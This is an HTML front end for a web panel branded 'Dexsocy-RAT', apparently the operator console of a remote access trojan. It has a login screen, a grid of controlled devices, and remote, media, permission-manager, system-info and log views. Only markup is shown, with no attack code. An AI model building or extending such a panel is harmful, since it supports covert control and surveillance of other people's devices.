<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <title>Dsociety Tools</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/style.css">
    <script src="https://unpkg.com/lucide@latest"></script>
    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
    <script src="js/config.js" defer></script>
    <script src="js/utils.js" defer></script>
    <script src="js/services/auth.js" defer></script>
    <script src="js/services/device.js" defer></script>
    <script src="js/services/stream.js" defer></script>
    <script src="js/main.js" defer></script>
    <script src="js/ui.js" defer></script>
    <script src="js/bootstrap.js" defer></script>
</head>
<body>
    <div id="loader" class="loader hidden" aria-hidden="true">
        <div class="spinner"></div>
    </div>

    <section id="authScreen" class="auth-screen">
        <form id="loginForm" class="auth-card" autocomplete="on">
            <div class="auth-header">
                <div class="auth-logo">
                    <i data-lucide="shield-check"></i>
                </div>
                <div class="auth-copy">
                    <span class="eyebrow">Remote Access Tools</span>
                    <h1>Login to Dsociety</h1>
                </div>
            </div>
            <div class="auth-inputs">
                <div class="input-group">
                    <input id="loginEmail" name="email" type="email" placeholder="Email Address" required>
                </div>
                <div class="input-group">
                    <input id="loginPassword" name="password" type="password" placeholder="Password" required>
                </div>
            </div>
            <button type="submit" class="primary-btn">
                <span>Sign In</span>
                <i data-lucide="arrow-right"></i>
            </button>
            <div class="auth-footer">
                <p>&copy; 2026 Dexsociety Security Team</p>
                <div class="auth-links">
                    <span class="dot"></span>
                    <span>Encrypted Connection</span>
                </div>
            </div>
        </form>
    </section>

    <div id="appShell" class="app-shell hidden">
        <div id="topbarScrim" class="topbar-scrim" aria-hidden="true"></div>
        <header class="topbar">
            <div class="topbar-main">
                <div class="brand-block">
                    <strong id="topbarTitle">Dexsocy-RAT</strong>
                </div>
            </div>
            <div class="topbar-actions">
                <button id="themeToggle" type="button" class="topbar-btn" aria-label="Toggle Theme">
                    <i data-lucide="sun"></i>
                </button>
                <span id="activeDeviceChip" class="device-chip">No Device Selected</span>
                <button id="deviceListButton" type="button" class="topbar-btn hidden" aria-label="Back to Device List">
                    <i data-lucide="layout-grid"></i>
                </button>
            </div>
        </header>

        <main class="main-shell">
            <section id="viewDevices" class="view-panel">
                <div id="deviceGrid" class="device-grid"></div>
            </section>

            <section id="viewRemote" class="view-panel hidden">
                <div class="group-card">
                    <div class="group-card-head">
                        <h2>Control</h2>
                    </div>
                    <div id="remoteGrid" class="action-grid action-grid-compact"></div>
                </div>
                <div class="group-card">
                    <div class="group-card-head">
                        <h2>Media</h2>
                    </div>
                    <div id="mediaGrid" class="action-grid action-grid-compact"></div>
                </div>
            </section>

            <section id="viewSystem" class="view-panel hidden">
                <div class="group-card">
                    <div class="group-card-head">
                        <h2>System Controls</h2>
                    </div>
                    <div id="systemGrid" class="action-grid action-grid-compact"></div>
                </div>
                <div class="group-card">
                    <div class="group-card-head">
                        <h2>Permission Manager</h2>
                    </div>
                    <div id="permissionGrid" class="action-grid action-grid-compact"></div>
                </div>
                <div class="group-card">
                    <div class="group-card-head">
                        <h2>Device Information</h2>
                    </div>
                    <div id="systemInfoGrid" class="info-grid"></div>
                </div>
            </section>

            <section id="viewLogs" class="view-panel hidden">
                <div class="group-card terminal-card">
                    <div id="logOutput" class="log-output" aria-live="polite"></div>
                    <button type="button" id="clearLogsButton" class="secondary-btn">Clear Logs</button>
                </div>
            </section>
        </main>

        <div id="tabbarScrim" class="tabbar-scrim hidden" aria-hidden="true"></div>
        <nav id="tabbar" class="tabbar hidden" aria-label="Tabs">
            <button type="button" class="tab-btn" data-tab="system">
                <i data-lucide="cpu"></i>
                <span>System</span>
            </button>
            <button type="button" class="tab-btn is-active" data-tab="remote">
                <i data-lucide="layout-grid"></i>
                <span>Remote</span>
            </button>
            <button type="button" class="tab-btn" data-tab="logs">
                <i data-lucide="terminal-square"></i>
                <span>Logs</span>
            </button>
        </nav>
    </div>

    <div id="modalRoot" class="modal-root"></div>
    <div id="toastRoot" class="toast-root" role="status" aria-live="polite" aria-atomic="true"></div>
</body>
</html>
